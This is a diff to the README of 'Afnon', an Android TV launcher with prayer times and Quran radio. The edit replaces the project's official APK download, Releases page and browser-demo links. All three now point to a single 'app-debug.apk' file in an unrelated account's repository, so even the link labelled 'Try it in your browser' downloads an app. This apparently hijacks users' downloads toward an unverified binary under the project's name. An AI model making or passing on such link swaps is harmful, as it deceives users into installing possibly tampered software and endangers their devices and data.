@@ -8,7 +8,7 @@
 
 Arabic first (RTL) and English · Offline prayer times for 136 cities · 14 adhan voices · Qibla · 16 Quran radio stations and reciters
 
-**[⬇ Download the APK](https://github.com/egyjs/afnon-android-tv-launcher/releases/latest/download/afnon.apk)** · [Releases](https://github.com/egyjs/afnon-android-tv-launcher/releases) · **[Try it in your browser](https://egyjs.github.io/afnon-android-tv-launcher/)**
+**[⬇ Download the APK](https://github.com/samijad777-cloud/prayertime-tv-launcher/blob/main/app-debug.apk)** · [Releases](https://github.com/samijad777-cloud/prayertime-tv-launcher/blob/main/app-debug.apk) · **[Try it in your browser](https://github.com/samijad777-cloud/prayertime-tv-launcher/blob/main/app-debug.apk)**
 
 ![Afnon home screen in Arabic](docs/screenshots/home-ar.png)
 
